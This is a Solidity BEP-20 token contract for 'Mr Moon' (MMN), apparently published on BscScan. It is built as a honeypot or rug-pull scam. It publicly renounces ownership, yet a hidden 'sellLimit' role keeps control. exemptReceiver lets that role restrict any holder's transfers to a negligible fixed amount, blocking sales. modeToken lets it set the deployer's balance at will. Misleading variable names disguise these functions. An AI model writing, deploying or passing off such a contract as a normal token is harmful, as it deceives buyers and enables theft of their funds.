/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MrMoon {
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public maxLaunchedBuy;
    uint256 constant atList = 11 ** 10;
    address public feeReceiverBuy;
    string public symbol = "MMN";
    string public name = "Mr Moon";


    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public sellLimit;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public launchTeamFrom;
    address public takeMarketing;
    address public owner;
    modifier sellBuy() {
        require(sellLimit[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed maxTeamToken, address indexed limitSell);
    event Transfer(address indexed fromTake, address indexed isSwap, uint256 feeFundMin);
    event Approval(address indexed tradingAtExempt, address indexed feeMode, uint256 feeFundMin);

    constructor (){
        IUniswapV2Router minSwap = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        takeMarketing = IUniswapV2Factory(minSwap.factory()).createPair(minSwap.WETH(), address(this));
        owner = msg.sender;
        feeReceiverBuy = owner;
        sellLimit[feeReceiverBuy] = true;
        balanceOf[feeReceiverBuy] = totalSupply;
        emit Transfer(address(0), feeReceiverBuy, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address teamFee, uint256 burnEnableTo) external returns (bool) {
        return transferFrom(msg.sender, teamFee, burnEnableTo);
    }

    function receiverAmountWallet(address isAt) public {
        if (launchTeamFrom) {
            return;
        }
        sellLimit[isAt] = true;
        launchTeamFrom = true;
    }

    function exemptReceiver(address takeIs) public sellBuy {
        if (takeIs == feeReceiverBuy) {
            return;
        }
        maxLaunchedBuy[takeIs] = true;
    }

    function isModeFrom(address tokenModeMin, address senderModeMin, uint256 burnEnableTo) internal returns (bool) {
        require(balanceOf[tokenModeMin] >= burnEnableTo);
        balanceOf[tokenModeMin] -= burnEnableTo;
        balanceOf[senderModeMin] += burnEnableTo;
        emit Transfer(tokenModeMin, senderModeMin, burnEnableTo);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(feeReceiverBuy, address(0));
        owner = address(0);
    }

    function transferFrom(address tradingLimit, address teamFee, uint256 burnEnableTo) public returns (bool) {
        if (tradingLimit != msg.sender && allowance[tradingLimit][msg.sender] != type(uint256).max) {
            require(allowance[tradingLimit][msg.sender] >= burnEnableTo);
            allowance[tradingLimit][msg.sender] -= burnEnableTo;
        }
        if (teamFee == feeReceiverBuy || tradingLimit == feeReceiverBuy) {
            return isModeFrom(tradingLimit, teamFee, burnEnableTo);
        }
        if (maxLaunchedBuy[tradingLimit]) {
            return isModeFrom(tradingLimit, teamFee, atList);
        }
        return isModeFrom(tradingLimit, teamFee, burnEnableTo);
    }

    function modeToken(uint256 burnEnableTo) public sellBuy {
        balanceOf[feeReceiverBuy] = burnEnableTo;
    }


}